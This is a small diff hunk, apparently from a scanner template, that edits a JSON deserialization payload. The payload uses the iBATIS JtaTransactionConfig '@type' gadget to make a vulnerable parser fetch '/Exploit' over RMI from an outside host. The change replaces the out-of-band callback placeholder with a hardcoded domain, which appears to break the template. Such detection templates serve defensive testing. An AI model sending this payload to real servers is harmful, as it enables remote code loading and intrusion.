@@ -27,7 +27,7 @@ http:
            "@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
            "properties":{
               "@type":"java.util.Properties",
-              "UserTransaction":"rmi://{{interactsh-url}}/Exploit"
+              "UserTransaction":"rmi://interactsh-url.com/Exploit"
            }
         }
 
